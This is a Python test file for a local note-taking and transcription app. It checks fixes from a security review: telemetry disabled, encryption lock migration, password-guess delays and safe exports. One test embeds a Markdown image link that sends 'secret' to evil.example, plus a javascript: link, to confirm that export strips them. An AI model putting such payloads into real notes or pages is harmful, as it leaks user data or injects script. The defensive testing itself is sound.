"""What the independent review of 0.7 found, one test each."""
import http.client
import json
import os
import struct
import tempfile
import threading
import unittest
from pathlib import Path
from unittest import mock

from cairn import config, lock, render, seal
from tests.test_lock import PASSWORD, Base, wav_bytes


class TelemetryTest(unittest.TestCase):
    def test_every_program_started_runs_with_the_libraries_reports_off(self):
        for key in ("PYANNOTE_METRICS_ENABLED", "OTEL_SDK_DISABLED", "HF_HUB_DISABLE_TELEMETRY", "DO_NOT_TRACK"):
            self.assertIn(key, config.NO_TELEMETRY)
        self.assertEqual(config.NO_TELEMETRY["PYANNOTE_METRICS_ENABLED"], "0")
        from cairn import diarize

        with mock.patch.object(diarize, "available", return_value=True), mock.patch.object(diarize.subprocess, "Popen", side_effect=OSError("stop here")) as popen:
            diarize._exec("a.wav", 10, False)
        self.assertEqual(popen.call_args.kwargs["env"]["PYANNOTE_METRICS_ENABLED"], "0")
        from cairn import speech

        with mock.patch.object(speech.subprocess, "Popen") as popen:
            speech._WORKER.update(proc=None, key=None)
            speech._worker("mlx", "/models/x")
        self.assertEqual(popen.call_args.kwargs["env"]["PYANNOTE_METRICS_ENABLED"], "0")

    def test_the_speaker_worker_installs_the_network_guard_before_the_library_loads(self):
        source = (Path(__file__).resolve().parent.parent / "cairn" / "diarize_worker.py").read_text()
        self.assertLess(source.index("netguard.install()"), source.index("from pyannote.audio import Pipeline  # noqa: F401"))


class OpeningTest(Base):
    """Turning the lock off while someone keeps working."""

    def test_a_note_edited_during_the_pass_stays_readable_after_it(self):
        self.populate()
        lock.enable(PASSWORD)
        lock.migrate(True)
        lock.disable(PASSWORD)  # from here, writes stay plain
        config.write_json(self.home / "Texts" / "n1.json", {"id": "n1", "title": "edited while opening"})
        self.assertFalse(seal.is_blob((self.home / "Texts" / "n1.json").read_bytes()))
        lock.migrate(False)
        lock.finish_disable()
        self.assertFalse(lock.enabled())
        self.assertEqual(config.read_json(self.home / "Texts" / "n1.json")["title"], "edited while opening")

    def test_the_key_is_kept_while_anything_is_still_sealed(self):
        self.populate()
        lock.enable(PASSWORD)
        lock.migrate(True)
        lock.disable(PASSWORD)
        with self.assertRaises(lock.LockError) as ctx:
            lock.finish_disable()  # nothing was opened yet: the key must not go
        self.assertEqual(ctx.exception.code, "incomplete")
        self.assertTrue(lock.enabled())
        lock.abort_disable()
        self.assertFalse(lock.info()["opening"])
        self.assertFalse(lock.info()["sealed"])  # the upkeep seals what is left
        lock.migrate(True)
        self.assertTrue(lock.info()["sealed"])

    def test_a_stop_in_the_middle_is_known_and_taken_up_again(self):
        self.populate()
        lock.enable(PASSWORD)
        lock.migrate(True)
        lock.disable(PASSWORD)
        self.assertTrue(lock.info()["opening"])  # written on disk: a restart finds it
        lock.lock_now()
        lock.unlock(PASSWORD)
        self.assertTrue(lock.info()["opening"])
        self.assertTrue(config._plain_writes)  # still writing plain, still being opened
        lock.migrate(False)
        lock.finish_disable()
        self.assertFalse(config._plain_writes)

    def test_a_file_that_cannot_be_opened_does_not_stop_the_others(self):
        self.populate()
        lock.enable(PASSWORD)
        lock.migrate(True)
        (self.home / "Texts" / "bad.json").write_bytes(seal.BLOB_MAGIC + b"x" * 40)  # looks sealed, is not
        lock.disable(PASSWORD)
        with self.assertRaises(lock.MigrationFailed) as ctx:
            lock.migrate(False)
        self.assertEqual([f[0] for f in ctx.exception.failures], ["bad.json"])
        self.assertFalse(seal.is_blob((self.home / "Texts" / "n1.json").read_bytes()))  # the rest was opened

    def test_a_drive_file_that_only_starts_like_a_sealed_one_cannot_stop_anything(self):
        fake = self.home / "Audio" / "evil.wav"
        fake.parent.mkdir(parents=True)
        fake.write_bytes(seal.FILE_MAGIC + b"\0" * 16 + struct.pack(">Q", 10 ** 12) + b"junk")  # declares a terabyte
        self.assertFalse(seal.is_sealed(fake))
        lock.enable(PASSWORD)
        lock.migrate(True)  # sealed like any plain recording
        self.assertTrue(seal.is_sealed(fake))
        lock.disable(PASSWORD)
        lock.migrate(False)
        lock.finish_disable()

    def test_a_busy_job_leaves_the_lock_as_it_was(self):
        from cairn import jobs, server

        lock.enable(PASSWORD)
        app, httpd = server.make_server(18863)
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        self.addCleanup(httpd.server_close)
        self.addCleanup(httpd.shutdown)
        app.jobs._state.update(running=True, kind="import")
        conn = http.client.HTTPConnection("127.0.0.1", app.port, timeout=30)
        conn.request("POST", "/api/lock/disable", json.dumps({"password": PASSWORD}), {
            "Host": "127.0.0.1:%d" % app.port, "Cookie": "cairn_session=" + app.token, "X-Cairn": "1", "Content-Type": "application/json"})
        resp = conn.getresponse()
        resp.read()
        conn.close()
        self.assertEqual(resp.status, 409)
        self.assertFalse(lock.info()["opening"])
        self.assertFalse(config._plain_writes)
        app.jobs._state.update(running=False, kind="")


class SealEverythingTest(Base):
    def test_recordings_outside_the_audio_folder_are_sealed_too(self):
        self.populate()
        elsewhere = Path(self.tmp.name) / "OldAudio" / "old.wav"
        elsewhere.parent.mkdir()
        elsewhere.write_bytes(wav_bytes(1))
        config.write_json(self.home / "settings.json", {"audio_dir": str(self.home / "NewAudio")})
        config.write_json(self.home / "Texts" / "old.json", {"id": "old", "status": "done", "audio": str(elsewhere)})
        lock.enable(PASSWORD)
        lock.migrate(True)
        self.assertTrue(seal.is_sealed(elsewhere))  # the note points to it: it is sealed wherever it is

    def test_a_seal_that_failed_once_is_tried_again(self):
        self.populate()
        lock.enable(PASSWORD)
        lock.migrate(True)
        late = self.home / "Audio" / "late.wav"
        late.write_bytes(wav_bytes(1))  # arrived and could not be sealed
        self.assertFalse(seal.is_sealed(late))
        self.assertFalse(lock.recheck_due())
        lock._state["checked"] -= 7 * 3600
        self.assertTrue(lock.recheck_due())
        lock.migrate(True)
        self.assertTrue(seal.is_sealed(late))

    def test_plain_files_are_refused_once_everything_is_sealed(self):
        self.populate()
        lock.enable(PASSWORD)
        self.assertEqual(config.read_json(self.home / "Texts" / "n1.json")["title"], "Appel Brandt")  # during the first pass plain files are read
        lock.migrate(True)
        (self.home / "Texts" / "planted.json").write_text(json.dumps({"id": "planted", "status": "done", "title": "x"}))
        self.assertEqual(config.read_json(self.home / "Texts" / "planted.json"), {})
        from cairn import notes

        self.assertNotIn("planted", [n["id"] for n in notes.Store(self.home / "Texts").slim()])

    def test_one_damaged_note_does_not_take_the_list_down(self):
        from cairn import notes

        self.populate()
        lock.enable(PASSWORD)
        lock.migrate(True)
        (self.home / "Texts" / "n1.json").write_bytes(seal.BLOB_MAGIC + b"x" * 60)
        store = notes.Store(self.home / "Texts")
        self.assertEqual(store.slim(), [])  # the damaged one is left out and the rest is listed (here there is no other)
        config.write_json(self.home / "Texts" / "ok.json", {"id": "ok", "status": "done", "title": "fine"})
        self.assertEqual([n["id"] for n in store.slim()], ["ok"])
        lock.lock_now()
        with self.assertRaises(config.Locked):
            notes.Store(self.home / "Texts").slim()  # locked is still locked

    def test_locking_makes_the_lists_forget(self):
        from cairn import notes, search

        self.populate()
        lock.enable(PASSWORD)
        lock.migrate(True)
        store = notes.Store(self.home / "Texts")
        store.slim()
        list(search._load(self.home / "Texts"))
        self.assertTrue(store._cache and search._CACHE)
        lock.lock_now()
        self.assertFalse(store._cache)
        self.assertFalse(search._CACHE)

    def test_leftovers_of_a_crash_are_removed_at_start(self):
        self.populate()
        tmp = self.home / ".tmp"
        tmp.mkdir()
        (tmp / "abc.wav").write_bytes(b"decrypted recording")
        (self.audio.parent / "x.wav.new").write_bytes(b"half")
        lock.leftovers()
        self.assertEqual(list(tmp.glob("*")), [])
        self.assertFalse((self.audio.parent / "x.wav.new").exists())
        self.assertTrue(self.audio.exists())  # a real recording is never touched


class GuessingTest(Base):
    def test_every_secret_check_waits_after_wrong_tries(self):
        phrase = lock.enable(PASSWORD)
        lock._state["fails"] = 5
        waited = []
        with mock.patch.object(lock.time, "sleep", side_effect=waited.append):
            for call in (lambda: lock.unlock("wrong password"), lambda: lock.change_password("wrong password", "another long one"),
                         lambda: lock.new_phrase("wrong password"), lambda: lock.recover("AAAAA", "another long one"), lambda: lock.disable("wrong password")):
                with self.assertRaises(lock.LockError):
                    call()
        self.assertEqual(len(waited), 5)  # unlock, password change, new phrase, recovery and turning off all go through the same wait
        self.assertTrue(all(w >= 1 for w in waited))

    def test_guesses_are_taken_one_at_a_time(self):
        lock.enable(PASSWORD)
        inside, worst = [0], [0]
        real = lock._unwrap

        def watch(*args):
            inside[0] += 1
            worst[0] = max(worst[0], inside[0])
            try:
                return real(*args)
            finally:
                inside[0] -= 1

        threads = []
        with mock.patch.object(lock, "_unwrap", watch), mock.patch.object(lock.time, "sleep"):
            for _ in range(6):
                t = threading.Thread(target=lambda: lock._open_with("wrong password", lock._read(), "wrap"))
                threads.append(t)
                t.start()
            for t in threads:
                t.join()
        self.assertEqual(worst[0], 1)


class ExportAndLinksTest(Base):
    def test_markdown_carries_no_link_or_image_a_viewer_would_fetch(self):
        note = {"id": "n", "title": "T", "date": "2026-10-05T10:00:00", "lang": "en", "status": "done",
                "summary": {"tldr": "See ![x](https://evil.example/?d=secret) and [click](javascript:alert(1)).", "actions": [], "key_points": ["[ref]: https://evil.example/r"]},
                "clean": "[00:01] hello there"}
        text = render.to_markdown(note)
        self.assertNotIn("](", text)
        self.assertNotIn("![", text)
        self.assertNotRegex(text, r"(?m)^\s*\[[^\]]+\]:")
        self.assertIn("[00:01] hello there", text)  # Cairn's own time stamps are untouched

    def test_with_the_lock_on_no_plain_copy_is_kept_in_exports(self):
        from cairn import server

        self.populate()
        lock.enable(PASSWORD)
        app, httpd = server.make_server(18864)
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        self.addCleanup(httpd.server_close)
        self.addCleanup(httpd.shutdown)
        config.write_json(self.home / "Texts" / "e1.json", {"id": "e1", "status": "done", "title": "Plan", "date": "2026-10-05T10:00:00", "lang": "en", "summary": {"tldr": "x"}})

        def post():
            conn = http.client.HTTPConnection("127.0.0.1", app.port, timeout=30)
            conn.request("POST", "/api/note/e1/export", json.dumps({"fmt": "md"}), {"Host": "127.0.0.1:%d" % app.port, "Cookie": "cairn_session=" + app.token, "X-Cairn": "1", "Content-Type": "application/json"})
            r = conn.getresponse()
            body = json.loads(r.read())
            conn.close()
            return r.status, body

        status, body = post()
        self.assertEqual((status, body["saved"]), (200, False))
        self.assertFalse((self.home / "Exports").exists())
        with mock.patch.object(lock, "enabled", return_value=False):  # the same request with no lock
            status, body = post()
            self.assertTrue(body["saved"])
            status, body2 = post()
            self.assertNotEqual(body["name"], body2["name"])  # the second one does not overwrite the first
            mode = os.stat(self.home / "Exports" / body["name"]).st_mode & 0o777
            self.assertEqual(mode, 0o600)

    def test_a_long_recording_is_never_sent_whole_without_a_range(self):
        from cairn import server

        audio = self.home / "Audio" / "long.wav"
        audio.parent.mkdir(parents=True)
        audio.write_bytes(b"RIFF" + b"\0" * (17 * 1024 * 1024))
        app, httpd = server.make_server(18865)
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        self.addCleanup(httpd.server_close)
        self.addCleanup(httpd.shutdown)
        config.write_json(self.home / "Texts" / "l.json", {"id": "l", "status": "done", "audio": str(audio)})
        conn = http.client.HTTPConnection("127.0.0.1", app.port, timeout=30)
        conn.request("GET", "/api/note/l/audio", headers={"Host": "127.0.0.1:%d" % app.port, "Cookie": "cairn_session=" + app.token})
        r = conn.getresponse()
        body = r.read()
        conn.close()
        self.assertEqual(r.status, 206)
        self.assertLessEqual(len(body), 16 * 1024 * 1024)


if __name__ == "__main__":
    unittest.main()
